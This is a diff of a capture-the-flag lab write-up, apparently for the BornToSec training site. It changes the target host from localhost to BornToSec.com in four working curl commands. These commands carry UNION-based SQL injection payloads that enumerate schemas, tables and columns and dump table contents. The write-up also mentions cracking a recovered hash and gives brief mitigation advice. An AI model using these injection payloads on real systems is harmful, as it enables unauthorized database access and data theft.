@@ -17,7 +17,7 @@ We decided to present two different methods: one using the input box on the webp
 ```
 
 ```
-curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit#' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>Title: //' | sed 's/<br\/>.*//'
+curl -s 'http://BornToSec.com/index.php?page=searchimg&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit#' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>Title: //' | sed 's/<br\/>.*//'
 ```
 
 ---
@@ -29,7 +29,7 @@ curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Csc
 ```
 
 ```
-curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+table_name%2Ctable_schema+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Database   : /' | sed 's/Url : /[-] Table name : /' | grep -v table
+curl -s 'http://BornToSec.com/index.php?page=searchimg&id=0+UNION+SELECT+table_name%2Ctable_schema+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Database   : /' | sed 's/Url : /[-] Table name : /' | grep -v table
 ```
 
 ---
@@ -47,7 +47,7 @@ echo -n 'list_images' | xxd -p
 ```
 
 ```
-curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D0x6c6973745f696d61676573%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: //' | grep -v 'Url : '
+curl -s 'http://BornToSec.com/index.php?page=searchimg&id=0+UNION+SELECT+1%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D0x6c6973745f696d61676573%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: //' | grep -v 'Url : '
 ```
 
 ---
@@ -59,7 +59,7 @@ curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Cco
 ```
 
 ```
-curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+title%2Ccomment+FROM+Member_images.list_images%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Title   : /' | sed 's/Url : /[-] Comment : /' | grep -v table
+curl -s 'http://BornToSec.com/index.php?page=searchimg&id=0+UNION+SELECT+title%2Ccomment+FROM+Member_images.list_images%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Title   : /' | sed 's/Url : /[-] Comment : /' | grep -v table
 ```
 
 ---
@@ -81,4 +81,4 @@ We used ```https://crackstation.net/``` to crack the hash. This page doesn't rea
 To protect against SQLi, it is crutial to always sanitize the users' input before querying the database. It is also possible to use an ORM or library to query the database and avoid manual sanitization.
 
 ## ☝️🤓 Advanced explanation
-While these SQLi allowed us to read most of the data present in the database, we could not read everything. After trying to read the database _Member\_Brute\_Force_, we got an error as the account used by the app on these pages did not have access to it.
+While these SQLi allowed us to read most of the data present in the database, we couldn't read everything. After trying to read the database _Member\_Brute\_Force_, we got an error as the account used by the app on these pages did not have access to it.
